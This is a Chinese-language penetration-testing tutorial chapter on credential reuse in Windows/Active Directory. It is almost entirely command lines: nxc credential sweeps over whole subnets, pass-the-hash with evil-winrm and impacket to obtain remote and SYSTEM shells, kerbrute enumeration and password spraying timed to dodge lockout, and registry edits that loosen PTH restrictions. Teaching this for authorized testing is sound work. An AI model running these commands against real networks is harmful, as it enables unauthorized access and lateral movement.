# 第 63 章 - 密碼重複使用與認證驗證

## 標籤

## 學習目標

- 能用 nxc 對多個服務、多個主機進行憑證驗證。
- 理解哪些協定支援 PTH（Pass the Hash），哪些只接受明文。
- 知道如何用已知憑證進行橫向移動。
- 能用最小化測試避免帳號鎖定。

---

## 理論基礎：憑證重用的核心邏輯

企業環境常見問題：同一密碼用在多個系統、服務帳號跨主機重用、本機管理員密碼相同。

| 材料類型 | PTH 可用 | 可用服務 | 說明 |
|----------|----------|----------|------|
| NT hash | 是 | SMB / WinRM / RDP（受限）| 不需知道明文 |
| NetNTLMv2 hash | 否 | - | 只能離線破解，不能直接重用 |
| 明文密碼 | 是（轉換） | 所有服務 | 可嘗試所有協定 |
| Kerberos ticket (.ccache) | 是（PTT）| Kerberos 認證服務 | Pass the Ticket |

## 方法一：多服務憑證驗證（nxc）

```bash
# SMB 驗證（最常用，快速確認是否有效）
nxc smb TARGET_IP -u USERNAME -p 'PASSWORD'
# 輸出 [+] → 憑證有效
# 輸出 [-] → 憑證無效
# 輸出 STATUS_LOGON_FAILURE → 密碼錯誤（帳號存在）
# 輸出 STATUS_ACCOUNT_LOCKED_OUT → 帳號已鎖定（立即停止！）

# WinRM 驗證（確認是否可遠端執行命令）
nxc winrm TARGET_IP -u USERNAME -p 'PASSWORD'
# 輸出 [+] ... (Pwn3d!) → 可用 evil-winrm 登入

# RDP 驗證
nxc rdp TARGET_IP -u USERNAME -p 'PASSWORD'

# SSH 驗證
nxc ssh TARGET_IP -u USERNAME -p 'PASSWORD'

# FTP 驗證
nxc ftp TARGET_IP -u USERNAME -p 'PASSWORD'

# LDAP 驗證（確認 AD 帳號是否有效）
nxc ldap DC_IP -u USERNAME -p 'PASSWORD'
# 適合驗證網域帳號，不測特定主機服務
```

---

## 方法二：對整個網段驗證（橫向移動）

```bash
# SMB 掃整個網段（憑證重用掃描）
nxc smb 192.168.1.0/24 -u admin -p 'Password123!'
# 對 /24 網段所有主機嘗試同一組憑證
# [+] 的主機就是可橫向移動的目標

# 使用 NT hash（PTH）
nxc smb 192.168.1.0/24 -u Administrator -H 'NTHASH'
# -H → NT hash，格式可以是純 NT 或 LM:NT
# 注意：本機 Administrator PTH 在 Windows 8+ 需注意 LocalAccountTokenFilterPolicy

# WinRM 掃網段（找可直接執行命令的主機）
nxc winrm 192.168.1.0/24 -u admin -p 'Password123!'
# 找到 (Pwn3d!) 的主機 → 直接 evil-winrm

# 指定多個使用者名稱（常見變體）
nxc smb 192.168.1.0/24 -u admin administrator Admin -p 'Password123!'
# 可以一次測多個帳號名稱
```

## 方法三：遠端命令執行（確認後）

```bash
# WinRM 登入（需 WinRM 可用且憑證有效）
evil-winrm -i TARGET_IP -u USERNAME -p 'PASSWORD'
# evil-winrm → 互動式 WinRM shell
# -i → 目標 IP

# evil-winrm PTH
evil-winrm -i TARGET_IP -u USERNAME -H 'NTHASH'
# -H → NT hash

# SMB 執行命令（需管理員）
nxc smb TARGET_IP -u admin -p 'Password123!' -x 'whoami'
# -x → 在目標執行命令（cmd）
# -X → 執行 PowerShell 命令

nxc smb TARGET_IP -u admin -p 'Password123!' -X 'Get-LocalUser'
# 用 PowerShell 命令

# impacket psexec（完整 SYSTEM shell）
impacket-psexec DOMAIN/admin:Password123!@TARGET_IP
# 得到 SYSTEM shell（服務安裝方式，較吵）

# impacket wmiexec（較低噪音）
impacket-wmiexec DOMAIN/admin:Password123!@TARGET_IP
# 透過 WMI 執行，不安裝服務

# impacket smbexec（低噪音，不落地）
impacket-smbexec DOMAIN/admin:Password123!@TARGET_IP

# PTH 版本
impacket-psexec -hashes ':NTHASH' DOMAIN/admin@TARGET_IP
impacket-wmiexec -hashes ':NTHASH' DOMAIN/admin@TARGET_IP
```

## 方法四：密碼噴灑（多帳號試少數密碼）

```bash
# 準備帳號列表（多種方法取得）
# 1. LDAP 查詢（需有 AD 帳號）
nxc ldap DC_IP -u USER -p PASS --users | awk '{print $5}' > users.txt
# --users → 列出所有 AD 使用者

# 2. Kerbrute 枚舉（不需帳號，透過 Kerberos）
kerbrute userenum -d DOMAIN --dc DC_IP /usr/share/seclists/Usernames/xato-net-10-million-usernames-ug.txt
# userenum → 帳號枚舉模式
# 回應差異：KDC_ERR_PREAUTH_REQUIRED（帳號存在）vs KDC_ERR_C_PRINCIPAL_UNKNOWN（不存在）

# SMB 密碼噴灑（nxc）
nxc smb DC_IP -u users.txt -p 'Summer2024!'
# 對所有帳號試同一個密碼
# 注意：鎖定閾值通常 3-5 次，每批只噴 1-2 個密碼

# 確認鎖定政策（避免鎖帳號）
nxc smb DC_IP -u USER -p PASS --pass-pol
# --pass-pol → 查詢密碼政策（鎖定閾值、觀察視窗）

# Kerberos 噴灑（kerbrute）
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Summer2024!'
# 對所有帳號試一個密碼，Kerberos 協定

# 等待鎖定計時器重置後再試下一批
sleep 1800   # 等 30 分鐘（觀察時間通常 30 分鐘重置）
nxc smb DC_IP -u users.txt -p 'Winter2024!'
```

## 方法五：Pass the Hash（PTH）

```bash
# PTH 原理：NTLM 認證不需要明文，只需 NT hash
# 支援 PTH 的服務：SMB、WinRM、LDAP、RDP（限制較多）

# nxc SMB PTH
nxc smb TARGET_IP -u Administrator -H 'NTHASH'
# 本機 Administrator PTH 注意事項：
# Windows Vista+ 預設啟用 UAC remote restriction
# 只有 RID-500 的 Administrator 可以跨主機 PTH（其他本機管理員不行）
# 若要讓其他本機管理員也能 PTH，目標需設定：
# reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

# nxc WinRM PTH
nxc winrm TARGET_IP -u USERNAME -H 'NTHASH'

# evil-winrm PTH
evil-winrm -i TARGET_IP -u USERNAME -H 'NTHASH'

# impacket PTH
impacket-wmiexec -hashes ':NTHASH' DOMAIN/admin@TARGET_IP
# LM hash 可以全 0 或 aad3b435b51404eeaad3b435b51404ee（空 LM）

# RDP PTH（需 Restricted Admin mode 啟用）
xfreerdp /v:TARGET_IP /u:admin /pth:NTHASH
# /pth → PTH 模式
# 目標需啟用 Restricted Admin mode：
# reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

## 驗證策略決策流程

```
取得憑證材料
    ↓
判斷材料類型
    ├─ 明文密碼 → 所有服務都可試
    ├─ NT hash → PTH（SMB/WinRM）或破解取明文
    └─ NetNTLMv2 → 只能破解，不能直接 PTH
    ↓
先確認鎖定政策（nxc --pass-pol）
    ↓
選最可控的認證面驗證
    ├─ SMB：nxc smb TARGET -u USER -p PASS
    ├─ WinRM：nxc winrm TARGET（(Pwn3d!) 代表可執行命令）
    └─ LDAP：nxc ldap DC_IP（驗證網域帳號）
    ↓
確認有效 → 掃整個網段橫向
nxc smb 192.168.1.0/24 -u USER -p PASS
    ↓
找到可執行命令的主機 → evil-winrm / wmiexec 登入
```

## 速查表

```bash
# 單一主機驗證
nxc smb TARGET_IP -u user -p 'Pass123'
nxc winrm TARGET_IP -u user -p 'Pass123'

# PTH
nxc smb TARGET_IP -u user -H 'NTHASH'
evil-winrm -i TARGET_IP -u user -H 'NTHASH'

# 網段掃描
nxc smb 192.168.1.0/24 -u admin -p 'Pass123'
nxc smb 192.168.1.0/24 -u admin -H 'NTHASH'

# 密碼噴灑
nxc smb DC_IP -u users.txt -p 'Summer2024!'
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Summer2024!'

# 查密碼政策
nxc smb DC_IP -u user -p pass --pass-pol

# 遠端執行
evil-winrm -i TARGET_IP -u user -p 'Pass123'
impacket-wmiexec DOMAIN/user:Pass123@TARGET_IP
impacket-wmiexec -hashes ':NTHASH' DOMAIN/user@TARGET_IP

# nxc 執行命令
nxc smb TARGET_IP -u user -p 'Pass123' -x 'whoami'

# 枚舉使用者（AD）
nxc ldap DC_IP -u user -p pass --users
kerbrute userenum -d DOMAIN --dc DC_IP userlist.txt
```
